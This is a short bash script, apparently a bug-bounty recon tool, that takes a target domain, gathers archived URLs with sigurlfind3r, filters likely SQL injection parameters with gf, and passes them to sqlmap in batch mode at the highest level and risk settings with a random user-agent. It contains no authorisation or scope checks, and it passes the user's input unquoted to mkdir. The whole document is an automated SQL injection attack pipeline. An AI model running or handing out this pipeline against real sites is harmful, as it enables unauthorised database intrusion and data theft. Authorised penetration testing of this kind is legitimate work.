#!/bin/bash

clear
if [ "$1" == "--help" ]; then
  echo " Usage :- ./`basename $0` "
  exit 0
fi
if [ "$1" == "-h" ]; then
  echo " Usage :- ./`basename $0` "
  exit 0
fi
echo
echo -e "\e[93m Hello ${USER}, its me @webcipher101 \e[00m"
echo "<< your work in progress please wait for some time >>"
echo 
echo " [+] Script started successfully "
read -p " [+] Enter your target name :- " name
mkdir $name
echo " [+] Your target data stored in $name"
sleep 1
echo " [+] sigurlfind3r started successfully"
sigurlfind3r -d $name -iS -s -f ".(jpg|jpeg|gif|png|ico|css|eot|tif|tiff|ttf|woff|woff2)" | anew -q $name/way_output.txt
echo " [+] Data saved in $name/way_output.txt"
sleep 1
echo " [+] Finding sqli endpoints"
cat $name/way_output.txt | gf sqli | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | anew -q $name/sqliPatterns.txt
echo " [+] Data saved in $name/sqliPatterns.txt"
sleep 1
echo " [+] Wait for sometime ... sending data to SQLMAP "
sleep 1
sqlmap -m $name/sqliPatterns.txt --batch --random-agent --level 3 --risk 3 --threads=5
